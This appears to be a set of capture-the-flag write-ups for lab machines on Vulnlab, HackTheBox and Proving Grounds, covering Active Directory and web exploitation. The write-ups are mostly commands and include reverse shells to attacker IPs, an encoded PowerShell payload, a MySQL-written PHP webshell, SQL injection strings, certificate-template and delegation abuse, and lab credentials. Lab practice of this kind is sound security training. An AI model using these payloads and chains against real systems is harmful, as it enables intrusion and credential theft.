docs.title: Retro2 -- Vulnlab (write-up)
docs.text: Difficulty: Hard Box: Retro2 (Vulnlab) Author: dsec Date: 2024-08-16

docs.title: Cracked an Access database from an SMB share to get LDAP creds, discovered pre-Windows 2000 computer accounts with default passwords, changed the machine account password via kpasswd, and used RBCD to escalate privileges.
Target info
docs.text:
• Domain: retro2.vl
  • DC: BLN01.retro2.vl

docs.title: Enumeration
docs.text:
Found an .accdb file -- had to be opened with MS Office (LibreOffice did not work), and it required a password.

  • Cracked with office2john: password is class08
  • Revealed creds: ldapreader:ppYaVcB5R

  • Also contains machine accounts:

The "Assign this computer account as a pre-Windows 2000 computer" checkbox assigns a password based on the new computer name. If the account was never used, the password should still be the default (lowercase computer name without the $).

docs.title: Machine account takeover
docs.text:
Set up Kerberos config:

echo "10.10.74.168 BLN01.retro2.vl BLN01" | sudo tee -a /etc/hosts

cat > ~/retro2.krb5.conf <<'EOF'
[libdefaults]
default_realm = RETRO2.VL
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
renew_lifetime = 7d
rdns = false
kdc_timesync = 1
ccache_type = 4
forwardable = true
proxiable = true

[realms]
RETRO2.VL = {
kdc = BLN01.RETRO2.VL
admin_server = BLN01.RETRO2.VL
}

[domain_realm]
.retro2.vl = RETRO2.VL
retro2.vl = RETRO2.VL
EOF

export KRB5_CONFIG=~/retro2.krb5.conf

Tested default machine account password:

nxc smb BLN01.retro2.vl -d RETRO2 -u 'FS02$' -p 'fs02'
  • Returns STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT -- confirms default password works.

Changed the machine account password:

kpasswd 'FS02$@RETRO2.VL'
# Old password: fs02
# New password: XyZ!2025retroFS02

Confirmed new password works:

nxc smb BLN01.retro2.vl -d RETRO2 -u 'FS02$' -p 'XyZ!2025retroFS02'


addcomputer.py -computer-name 'ADMWS01$' -computer-pass 'SomePassword' -no-add 'retro2.vl/FS02$:XyZ!2025retroFS02'

net rpc group members "SERVICES" -U retro2.vl/"ADMWS01$" -S BLN01.retro2.vl


xfreerdp /v:10.10.74.168 /u:.\ldapreader /p:'ppYaVcB5R' /sec:rdp /cert:ignore

docs.title: Lessons & takeaways
docs.text:
• Pre-Windows 2000 computer accounts have default passwords based on the lowercase computer name -- always check for these
  • office2john works for cracking Access database passwords
  • kpasswd can change machine account passwords if you know the current one
  • LibreOffice may not handle .accdb files the same way as MS Office -- sometimes you need the real thing

docs.text: Difficulty: Easy Box: Return (HackTheBox) Author: dsec Date: 2025-06-02

docs.title: Printer admin panel leaked service account password by redirecting LDAP auth to attacker. Server Operators group membership allowed service binary hijack for SYSTEM.
Target info
docs.text:
• Host: 10.129.89.59
  • Services discovered: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 445/tcp, 464/tcp, 593/tcp, 636/tcp, 3268/tcp, 3269/tcp, 5985/tcp, 9389/tcp

docs.title: Foothold
docs.text:
Changed the LDAP server IP to my tun0 IP and started a netcat listener on port 389:

Password captured: 1edFg43012!!

Could also use Responder instead of netcat:

Make sure to check what's running on 389 and kill it before running Responder:

sudo lsof -i :389
sudo kill -9 <PID>

docs.title: Privilege escalation
docs.text:
whoami /groups

User was in BUILTIN\Server Operators which can start/stop services.

Uploaded nc64.exe, started listener, and hijacked a service:

sc.exe config VSS binpath="C:\programdata\nc64.exe -e cmd 10.10.14.6 443"

Received SYSTEM shell.

docs.title: Lessons & takeaways
docs.text:
• Always check printer/device admin panels for LDAP config -- redirecting auth to your listener can capture credentials
  • Server Operators group can modify service binaries, leading to trivial SYSTEM escalation

docs.title: Privilege escalation
docs.text:
sudo /usr/bin/systemctl status trail.service

Command hangs at the pager. Since it runs in root context, typing !sh spawns a root shell.

docs.title: Lessons & takeaways
docs.text:
• systemctl status uses a pager (less) -- if running as root, !sh gives a root shell
  • Always check what commands you can run with sudo -l

docs.text:
Generated a username wordlist from names found on the site and ran kerbrute:

kerbrute userenum --dc 10.129.46.21 -d egotistical-bank.local formatted_name_wordlist.txt

Added egotistical-bank.local to /etc/hosts.

Got fsmith's AS-REP hash. Cracked it:

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Password: Thestrokes23

nxc smb 10.129.46.21 -u 'fsmith' -p 'Thestrokes23' --users

docs.title: BloodHound
docs.text:
bloodhound-python -c All -ns 10.129.46.21 -d egotistical-bank.local -u fsmith -p 'Thestrokes23'

Shortest path to DA from owned principals:

fsmith has CanPSRemote.

nxc winrm 10.129.102.130 -u 'fsmith' -p 'Thestrokes23'

docs.title: WinPEAS -- svc_loanmgr creds
docs.text:
whoami /priv

Uploaded and ran winPEASx64.exe:

WinPEAS showed creds but the username spelling was wrong. Looked in BloodHound and found the actual user was svc_loanmgr -- creds worked for this account.

docs.title: DCSync
docs.text:
In BloodHound, first degree object control of svc_loanmgr:

GetChangesAll + GetChanges = DCSync.

docs.title: Lessons & takeaways

  • WinPEAS can show creds with slightly wrong usernames -- cross-reference with BloodHound
  • GetChanges + GetChangesAll on the domain object = DCSync capability

docs.title: Sendai — Vulnlab (write-up)
docs.text: Difficulty: Medium Box: Sendai (Vulnlab) Author: dsec Date: 2025-03-20

docs.title: Enumerated SMB shares and found creds. Pivoted through multiple users via password spraying and PrivescCheck. clifford.davey in the CA-Operators group had full control over the SendaiComputer certificate template (ESC4), which was modified to impersonate Administrator.
Target info
docs.text:
• Host: 10.10.72.38
  • Domain: sendai.vl / dc.sendai.vl

docs.title: Foothold
docs.text:
Accessed the Sendai share:

Same privileges as:

docs.title: Lateral movement
docs.text:
Hash: edac7f05cded0b410232b7466ec47d6f

Found: sqlsvc:SurenessBlob85

Ran PrivescCheck:

Found: clifford.davey:RFmoB2WplgE_3p

clifford.davey belongs to the CA-Operators group.

docs.title: Privesc
docs.text:
Enumerated certificate templates with certipy:

certipy find -u clifford.davey -vulnerable -target dc.sendai.vl -dc-ip 10.10.72.38 -stdout

Found SendaiComputer template with Client Authentication EKU. CA-Operators group has Full Control -- ESC4 (access control abuse).

Wrote default configuration to make the template enrollable by domain users:

certipy template -u 'clifford.davey' -target dc.sendai.vl -dc-ip 10.10.72.38 -template 'SendaiComputer' -write-default-configuration -force

Verified the change:

certipy find -u clifford.davey -vulnerable -target dc.sendai.vl -dc-ip 10.10.72.38 -stdout

Requested a certificate as Administrator:

certipy req -u 'clifford.davey' -ca 'sendai-DC-CA' -target dc.sendai.vl -dc-ip 10.10.72.38 -template 'SendaiComputer' -upn 'administrator@sendai.vl' -dns 'whatever.sendai.vl' -key-size 4096 -out admin

Authenticated:

certipy auth -pfx admin.pfx -dc-ip 10.10.72.38

Got hash: aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a

docs.title: Lessons & takeaways
docs.text:
• PrivescCheck is valuable for finding stored credentials and misconfigurations on Windows hosts
  • Certificate template access control (ESC4) is exploitable when a group has Full Control over a template
  • Chain multiple credential pivots -- each user may unlock new groups and permissions
  • CA-Operators group membership is a strong indicator of ADCS attack potential

docs.title: Anonymous FTP revealed hints about a password file on Nathan's desktop. Directory traversal via NVMS-1000 leaked passwords. SSH + NSClient++ API exploitation for SYSTEM.
Target info
docs.text:
• Host: 10.129.227.77
  • Services discovered: 21/tcp (ftp), 22/tcp (ssh), 80/tcp (http), 135/tcp (msrpc), 139/tcp (netbios), 445/tcp (smb), 5666/tcp, 6063/tcp, 6699/tcp, 8443/tcp (NSClient++)

docs.title: Enumeration
docs.text:
Nmap showed anonymous FTP login was allowed. Found two files:

Confidential.txt:

Nathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards, Nadine

Notes to do.txt:

  1. Change the password for NVMS - Complete
  2. Lock down the NSClient Access - Complete
  3. Upload the passwords
  4. Remove public access to NVMS
  5. Place the secret files in SharePoint

docs.title: Foothold
docs.text:
Directory traversal on NVMS-1000 (port 80) via Burp:

Retrieved passwords from Nathan's desktop:

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$

Sprayed credentials:

nxc smb 10.129.227.77 -u users.txt -p passwords.txt --shares

Hit: Nadine:L1k3B1gBut7s@W0rk

docs.title: Privilege escalation
docs.text:
SSH'd in as Nadine. Found NSClient++ and retrieved its password:

nscp web -- password --display

Current password: ew2x6SsGTxjRwXOT

Port-forwarded to access NSClient++ web interface:

ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77

Uploaded a malicious script via the API:

curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\Users\Nadine\nc64.exe 10.10.14.142 443 -e cmd.exe"

Triggered execution:

curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=3m

Received SYSTEM shell.

docs.title: Lessons & takeaways
docs.text:
• Anonymous FTP often contains breadcrumbs pointing to sensitive files
  • Directory traversal on web management interfaces (NVMS-1000) can leak credential files
  • NSClient++ API can be abused for command execution when you have the admin password

docs.title: Sniper -- HackTheBox (write-up)
docs.text: Difficulty: Medium Box: Sniper (HackTheBox) Author: dsec Date: 2025-06-21

docs.title: LFI on the blog's language parameter allowed session file inclusion and RCE via PHP code injection in user registration. Lateral movement with found DB creds. Privesc via weaponized .chm file.
Target info
docs.text:
• Host: 10.129.17.159
  • Services discovered: 80/tcp (http), 445/tcp (smb)

docs.title: Enumeration
docs.text:
Found LFI on the blog page.

Remote include didn't load.

Confirmed local file read with \windows\win.ini:

Contents visible at bottom of page source.

docs.title: Foothold
docs.text:
Read session file using PHPSESSID cookie:

\windows\temp\sess_ih4s8m8ueki8p7ark9oakklmjs

Injected PHP code via user registration. <?php system("whoami") ?> was filtered, but backtick execution worked:

a<?php echo `whoami` ?>b

Checked registration.php for filters:

Filtered chars: -$[(_. ;&"\

To bypass filters, base64-encoded a reverse shell command:

echo -n 'cmd /c "\\\\10.10.14.142\\share\\nc64.exe -e cmd 10.10.14.142 443"' | iconv -f ascii -t utf-16le | base64 -w0

Registered with name:

<?php echo `powershell /enc YwBtAGQAIAAvAGMAIAAiAFwAXAAxADAALgAxADAALgAxADQALgAxADQAMgBcAHMAaABhAHIAZQBcAG4AYwA2ADQALgBlAHgAZQAgAC0AZQAgAGMAbQBkACAAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADIAIAA0ADQAMwAiAA==` ?>

Set up listener and SMB server:

rlwrap -cAr nc -lnvp 443
smbserver.py share share/ -smb2support

Triggered via LFI on the session file:

curl -s -G 'http://10.129.17.159/blog/' --data-urlencode 'lang=\windows\temp\sess_a7ppoamkv03k9u3sl6sdsog4kb'

docs.title: Lateral movement
docs.text:
Found DB creds in config:

dbuser:36mEAhz/B8xQ~2VM

Used Invoke-Command to pivot as Chris:

Invoke-Command -ScriptBlock { \\10.10.14.142\share\nc64.exe -e cmd 10.10.14.142 80 } -Credential $cred -Computer localhost

docs.title: Privilege escalation
docs.text:
Found instructions.chm in C:\Users\Chris\Downloads\.

Downloaded HTML Help Workshop from archive.org. On a Windows machine, generated a malicious .chm file:

. .\Out-CHM.ps1
Out-CHM -Payload "\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.142 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"

Transferred doc.chm to C:\Docs and nc64.exe to \windows\system32\spool\drivers\color\:

copy \\10.10.14.142\share\doc.chm .
copy \\10.10.14.142\share\nc64.exe \windows\system32\spool\drivers\color\

Set up listener and received admin shell within a minute:

rlwrap nc -lnvp 443

docs.title: Lessons & takeaways
docs.text:
• Check language/locale parameters for LFI and always view page source for file contents
  • When character filters block standard PHP functions, try backtick execution and base64-encoded payloads
  • .chm files can be weaponized for privilege escalation

docs.text:
Ran linpeas:

  • Writable /etc/passwd is instant root -- replace the x with a known password hash

docs.title: SolidState -- HackTheBox (write-up)
docs.text: Difficulty: Medium Box: SolidState (HackTheBox) Author: dsec Date: 2025-06-18

docs.title: Default creds on James mail server admin. Reset a user's password, read their email for SSH creds. Restricted bash escaped with ssh -t bash. Privesc via world-writable cron script running as root.
Target info
docs.text:
• Host: 10.129.226.162
  • Services discovered: 22/tcp (ssh), 25/tcp (smtp), 80/tcp (http), 110/tcp (pop3), 119/tcp (nntp), 4555/tcp (james-admin)

docs.title: Exploitation
docs.text:
Connected to James admin on port 4555 with default creds root:root:

Reset box (previous user data present), then set mindy's password:

Connected to POP3 and read mindy's emails with RETR:

RETR 1


RETR 2

SSH creds found: mindy:P@55W0rd1!2@

docs.title: User
docs.text:
• Landed in rbash (restricted bash)

Escaped rbash:

ssh mindy@10.129.226.162 -t bash

docs.title: Alternative path -- James exploit via bash_completion.d
docs.text:
The James mail server has a path traversal vulnerability -- usernames aren't sanitized, so creating a user like ../../../../etc/bash_completion.d drops email content as a script that runs on any user login:

Sent email with reverse shell payload via SMTP:

Commands:

EHLO 0xdf
MAIL FROM: <0xdf@10.10.14.133>
RCPT TO: <../../../../../../../../etc/bash_completion.d>
DATA
FROM: 0xdf@10.10.14.133

/bin/nc -e /bin/bash 10.10.14.133 443
.
quit

Started listener, triggered via SSH login as mindy:

docs.title: Privilege escalation
docs.text:
Found world-writable script in /opt:

Uploaded pspy to /dev/shm:

chmod +x pspy64
./pspy64

  • /opt/tmp.py runs every 3 minutes as root (UID=0)

Edited the script to add a reverse shell:

os.system('bash -c "bash -i >& /dev/tcp/10.10.14.133/443 0>&1"')

Waited for cron to trigger:

docs.title: Lessons & takeaways
docs.text:
• Default creds on James admin (root:root) -- reset user passwords to read emails
  • Escape rbash with ssh -t bash
  • World-writable scripts in cron are easy root -- use pspy to find them
  • James mail server path traversal can drop payloads into bash_completion.d

docs.title: Squid -- Proving Grounds (write-up)
docs.text: Difficulty: Intermediate Box: Squid (Proving Grounds) Author: dsec Date: 2025-08-23

docs.title: Squid proxy exposed internal services. MySQL with default creds led to webshell via INTO OUTFILE. Privesc with FullPowers + PrintSpoofer.
Target info
docs.text:
• Host: 192.168.195.189
  • Services discovered: 3128/tcp (squid proxy)

docs.title: Enumeration
docs.text:
sudo nmap -Pn -n 192.168.195.189 -sCV -p- --open -vvv

Used spose to enumerate services behind the Squid proxy:

python3 spose.py --proxy http://192.168.195.189:3128 --target 192.168.195.189

docs.title: Initial access
docs.text:
Set up Chrome Proxy Switcher to route through the Squid proxy:

Logged into phpMyAdmin with default creds root:'' (null password).

Went to the query tab and wrote a webshell via MySQL:

select "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/wamp/www/shell.php';

docs.title: Shell
docs.text:
Uploaded nc64.exe via the webshell using certutil (URL-encoded):

certutil -split -urlcache -f http://192.168.45.208/nc64.exe C:\wamp\www\nc64.exe

http://192.168.195.189:8080/shell.php?cmd=certutil%20-split%20-urlcache%20-f%20http://192.168.45.208/nc64.exe%20C:\wamp\www\nc64.exe

Triggered reverse shell (URL-encoded):

C:\wamp\www\nc64.exe 192.168.45.208 80 -e cmd.exe

http://192.168.195.189:8080/shell.php?cmd=C:%5C%5Cwamp%5C%5Cwww%5C%5Cnc64.exe%20192.168.45.208%2080%20-e%20cmd.exe

docs.title: Privilege escalation
docs.text:
• nothing useful initially
  • found hash: 02upvemrsyfklcrz

Looked into EDB-40967 but didn't have M permissions on files.

Used FullPowers to recover impersonation privileges:

certutil -split -urlcache -f http://192.168.45.208/FullPowers.exe C:\wamp\www\FullPowers.exe

.\FullPowers.exe

Then PrintSpoofer for SYSTEM:

certutil -split -urlcache -f http://192.168.45.208/printspoofer64.exe C:\wamp\www\printspoofer64.exe

.\printspoofer64.exe -i -c powershell

docs.title: Lessons & takeaways
docs.text:
• Squid proxies can expose internal-only services -- always enumerate behind them with spose
  • phpMyAdmin with default creds + INTO OUTFILE = instant webshell
  • FullPowers restores missing token privileges on service accounts, enabling PrintSpoofer

docs.title: StreamIO -- HackTheBox (write-up)
docs.text: Difficulty: Hard Box: StreamIO (HackTheBox) Author: dsec Date: 2024-11-07

docs.title: SQL injection on a movie search page dumped user hashes, which led to a web login. Parameter fuzzing found a hidden debug/include parameter that allowed RCE. Pivoted through multiple users via database creds, Firefox saved passwords, and BloodHound to abuse LAPS for domain admin.
Target info
docs.text:
• Domain: streamio.htb
  • Services discovered: 53/tcp, 80/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 443/tcp, 445/tcp, 464/tcp, 593/tcp, 636/tcp, 1433/tcp, 3268/tcp, 3269/tcp, 5985/tcp, 9389/tcp

docs.title: Enumeration
docs.text:
nmap -p- -sCV 10.129.249.105 -vvv
  • HTTPS on 443 was open. Added watch.streamio.htb to /etc/hosts.

Found potential users on the HTTP site:

  • Added to users.txt.

docs.title: SQL injection
docs.text:
feroxbuster -u https://watch.streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k

Found /search.php:

  • SQL query uses wildcards on both sides, something like: select * from movies where title like '%[input]%';

Tested with man';-- -:

  • Comments out the trailing wildcard, so all results end in "man".

vs just searching man:

Determined column count:

abcd' union select 1,2,3,4,5,6;-- -

  • Second column returns data. Replaced with @@version:

Enumerated databases:

abcd' union select 1,name,3,4,5,6 from master..sysdatabases;-- -

Got current database:

abcd' union select 1,(select DB_NAME()),3,4,5,6;-- -

Enumerated user tables:

abcd' union select 1,name,3,4,5,6 from streamio..sysobjects where xtype='U';-- -

  • xtype='U' filters to user-created tables only. Without it:

Got table IDs:

abcd' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U';-- -

Used IDs to get columns:

abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -

Dumped all users and password hashes:

abcd' union select 1,concat(username,':',password),3,4,5,6 from users;-- -

Cracked hashes with CrackStation. Notable cracks: - admin:paddpadd - Barry:$hadoW - yoshihide:66boysandgirls.. - plus several others.

nxc did not find valid creds for SMB, LDAP, or WinRM with any of these.

Brute-forced the web login with hydra:

hydra -L users1.txt -P passwords.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"

docs.title: Hidden parameter & RCE
docs.text:
After logging in, /admin was accessible (previously 403). Each link shows a different parameter:

  • ?user=, ?staff=, ?movie=, ?message=

Grabbed the session cookie:

Fuzzed for hidden parameters:

wfuzz -u https://streamio.htb/admin/\?FUZZ\= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=fbf6ev1okd8prjlbfm2kpp30cb" --hh 1678

  • Found ?debug=

Used PHP filter wrapper to read master.php:

https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php

Decoded the source and found at the bottom:

if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
  • eval(file_get_contents()) -- code execution via the include POST parameter.

Captured a request in Burp from https://streamio.htb/admin/?debug=master.php, changed GET to POST, added headers: - Pragma: no-cache - Cache-Control: no-cache - Content-Type: application/x-www-form-urlencoded

Added: include=http://10.10.14.172/rce.php

Where rce.php contained:

system("dir C:\");

Created shell.php:

system("powershell -c wget 10.10.14.172/nc64.exe -outfile \programdata\nc64.exe");
system("\programdata\nc64.exe -e powershell 10.10.14.172 443");

rlwrap -cAr nc -lnvp 443

docs.title: Lateral movement
docs.text:
Connected as yoshihide, who has no profile on the machine.

Searched for passwords in C:\inetpub:

Get-ChildItem -Recurse -File | Select-String -Pattern "PWD" | Select-Object Path, LineNumber, Line

dir -recurse *.php | select-string -pattern "database"

Found: - db_admin:B1@hx31234567890 - db_user:B1@hB1@hB1@h

Used sqlcmd (already installed) to query streamio_backup:

sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"

Found nikk37:389d14cb8e4e9b94b137deb1caf0612a -- cracked to get_dem_girls2@yahoo.com.

nxc winrm 10.129.107.166 -u nikk37 -p get_dem_girls2@yahoo.com
  • Pwn3d!
evil-winrm -i 10.129.107.166 -u nikk37 -p 'get_dem_girls2@yahoo.com'

Found Mozilla Firefox in Program Files (x86) -- abnormal. Located saved passwords:

Get-ChildItem -Path C:\Users\nikk37\AppData -Filter logins.json -Recurse -ErrorAction SilentlyContinue

Downloaded logins.json and key4.db, ran firepwd.py:

python firepwd.py

Found: JDgodd:JDg0dd1s@d0p3cr3@t0r

nxc smb 10.129.107.166 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r'
  • Valid for SMB and LDAP (not WinRM).

docs.title: BloodHound & LAPS
docs.text:
bloodhound-python -c All -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.129.107.166 -d streamio.htb -dc streamio.htb --zip

JDgodd has 1 First Degree Object Control:

Shortest Path to Domain Admins from Owned Principals:

Back on nikk37's evil-winrm shell, uploaded PowerView and added JDgodd to Core Staff:

. .\PowerView.ps1
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"

Used LAPS to get the admin password:

nxc smb 10.129.107.166 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds

  • LAPS password: [9z26A(3SOkt[(

Other methods (PowerShell Get-AdComputer and ldapsearch) did not work:

evil-winrm -i 10.129.107.166 -u administrator -p '[9z26A(3SOkt[('

Root flag was not on administrator's desktop:

Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue
type C:\Users\Martin\Desktop\root.txt

docs.title: Lessons & takeaways
docs.text:
• Parameter fuzzing on authenticated endpoints can reveal hidden functionality like ?debug=
  • PHP filter wrappers (php://filter/convert.base64-encode) let you read source code through LFI
  • Firefox saved passwords (logins.json + key4.db) are a goldmine -- firepwd.py decrypts them offline
  • LAPS passwords via nxc --laps can work even when PowerShell and ldapsearch methods fail

docs.title: Support -- HackTheBox (write-up)
docs.text: Difficulty: Easy Box: Support (HackTheBox) Author: dsec Date: 2025-07-19

docs.title: SMB share contained a .NET binary with XOR-encoded LDAP credentials. LDAP search revealed a password in the info field. Resource-based constrained delegation (RBCD) attack for domain admin.
Target info
docs.text:
• Host: 10.129.126.249
  • Domain: support.htb
  • Services discovered: 53/tcp, 88/tcp, 135/tcp, 139/tcp, 389/tcp, 445/tcp, 464/tcp, 593/tcp, 636/tcp, 3268/tcp, 3269/tcp, 5985/tcp, 9389/tcp

docs.title: Enumeration
docs.text:
enum4linux -a -u "guest" -p "" 10.129.126.249

Used lookupsid.py to enumerate users:

Found users including ldap, support, smith.rosario, hernandez.stanley, and others.

docs.title: Foothold
docs.text:
Opened UserInfo.exe from SMB share in dnSpy:

Found encoded password: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E, XOR key armando, constant 223.

Decoded with Python (base64 decode, XOR with key and 223):

LDAP password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

Searched LDAP:

ldapsearch -H ldap://10.129.126.249 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | less

Found password in the info field of the support user:

info: ==Ironside47pleasure40Watchful==

The support user was a member of Remote Management Users.

evil-winrm -i 10.129.126.249 -u support -p 'Ironside47pleasure40Watchful'

docs.title: Privilege escalation
docs.text:
Had SeMachineAccountPrivilege. Performed RBCD (Resource-Based Constrained Delegation) attack.

Uploaded Powermad.ps1, PowerView.ps1, and Rubeus.exe.

Verified machine account quota:

Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota

Returns 10. Added a fake computer:

New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)

Got the fake computer SID and set delegation:

$fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

Verified ACL:

Got RC4 hash and performed S4U attack:

.\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb
.\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

Saved and converted ticket on Kali:

base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass

docs.title: Lessons & takeaways
docs.text:
• Always reverse-engineer .NET binaries from SMB shares -- they often contain hardcoded credentials
  • LDAP info fields can contain passwords; search all user attributes
  • RBCD is a powerful attack when you have SeMachineAccountPrivilege and GenericAll on the DC

docs.title: Tabby -- HackTheBox (write-up)
docs.text: Difficulty: Easy Box: Tabby (HackTheBox) Author: dsec Date: 2025-03-08

docs.title: LFI leaked Tomcat creds. Deployed WAR reverse shell via manager-script role. Cracked zip password, reused for user pivot. Privesc via lxd group.
Target info
docs.text:
• Host: 10.129.207.244
  • Services discovered: 80/tcp (http), 8080/tcp (tomcat)

docs.title: Enumeration
docs.text:
Used view-source to read cleaner output:

Nothing at home/ash/.ssh/id_rsa.

docs.title: Port 8080 - Tomcat
docs.text:
Users defined in /etc/tomcat9/tomcat-users.xml. LFI to that path initially showed nothing.

Found: tomcat:$3cureP4s5w0rd123!

Creds failed for manager webapp but worked for host-manager webapp. The config also listed the manager-script role, which allows text-based commands at /manager/text.

docs.title: Shell
docs.text:
Generated WAR reverse shell and deployed via curl:

msfvenom -p java/shell_reverse_tcp lhost=10.10.14.194 lport=443 -f war -o rev.10.10.14.194-443.war

curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.129.207.244:8080/manager/text/deploy?path=/dank --upload-file rev.10.10.14.194-443.war

Triggered with:

curl http://10.129.207.244:8080/dank1

docs.title: Lateral movement
docs.text:
Found a backup zip at /var/www/html/files. Transferred it:

# on kali
nc -lnvp 443 > 16162020_backup.zip

# on target
md5sum 16162020_backup.zip
cat 16162020_backup.zip | nc 10.10.14.191 443

# on kali - verify
md5sum 16162020_backup.zip

Cracked the zip:

zip2john 16162020_backup.zip > hash.txt

Nothing useful in the archive, but ash reused the password:

su ash

docs.title: Privilege escalation
docs.text:
ash is in the lxd group. Used a base64-encoded tar archive to create a privileged container:

echo  | base64 -d > bob.tar.bz2

docs.title: Lessons & takeaways
docs.text:
• Tomcat manager-script role enables deployment via /manager/text even without GUI manager access
  • Always check for password reuse across services and local users
  • lxd group membership = trivial root via privileged container

docs.title: WordPress plugin (Gwolle Guestbook) RFI led to a shell as www-data. Lateral movement to onuma via sudo tar GTFOBins. Privesc through a root cron script called backuperer running every 5 minutes.
Target info
docs.text:
• Host: 10.129.1.185
  • Services discovered via nmap

docs.title: Enumeration
docs.text:
Directory enumeration revealed several paths:

  • /webservices/monstra-3.0.4/

Ran wpscan with aggressive plugin detection:

wpscan --url http://10.129.1.185:80/webservices/wp -e ap --plugins-detection aggressive --api-token <token>

docs.title: Foothold
docs.text:
Used PHP PentestMonkey reverse shell, renamed to wp-load.php and hosted on a Python web server. Exploited Gwolle Guestbook RFI:

http://10.129.1.185/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.191/

docs.title: Privesc
docs.text:
With pspy32, spotted a root cron script called backuperer running every 5 minutes:

  • CMD: UID=0 PID=24065 | /bin/bash /usr/sbin/backuperer

docs.title: Lessons & takeaways
docs.text:
• Default creds on a CMS (Monstra) can be a rabbit hole even when they work -- if the functionality is broken, move on
  • Always run wpscan with aggressive plugin detection; vulnerable plugins are a common entry point
  • Use pspy to discover cron jobs and scripts running as root

docs.title: TheFrizz -- HackTheBox (write-up)
docs.text: Difficulty: Medium Box: TheFrizz (HackTheBox) Author: dsec Date: 2025-06-28

docs.title: Gibbon LMS RCE (CVE-2023-45878) gave initial shell. MySQL creds in config led to user hash. Kerberos auth via kinit for SSH. Recycle bin recovery revealed second user creds with GPO editing rights. SharpGPOAbuse for domain admin.
Target info
docs.text:
• Host: frizzdc.frizz.htb
  • Domain: frizz.htb
  • Services discovered: 22/tcp (ssh), 80/tcp (http), 88/tcp (kerberos), 389/tcp (ldap), 445/tcp (smb)

docs.title: Foothold
docs.text:
Ran CVE-2023-45878 exploit for Gibbon LMS:

https://github.com/davidzzo23/CVE-2023-45878/blob/main/CVE-2023-45878.py

Found MySQL config at C:\xampp\htdocs\Gibbon-LMS\config.php:

MrGibbonsDB:MisterGibbs!Parrot!?1

Queried the database:

f.frizzle:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03

Cracked:

f.frizzle:Jenni_Luvs_Magic23

docs.title: Lateral movement
docs.text:
Normal SSH failed. Needed Kerberos authentication:

sudo ntpdate frizzdc.frizz.htb
kinit f.frizzle@FRIZZ.HTB
klist
ssh f.frizzle@frizz.htb -K

kinit worked because OpenSSH GSSAPI only checks the default Kerberos cache. Using getTGT.py with a custom cache file failed, but kinit populates the default cache.

Ran BloodHound collection:

cd C:\Temp
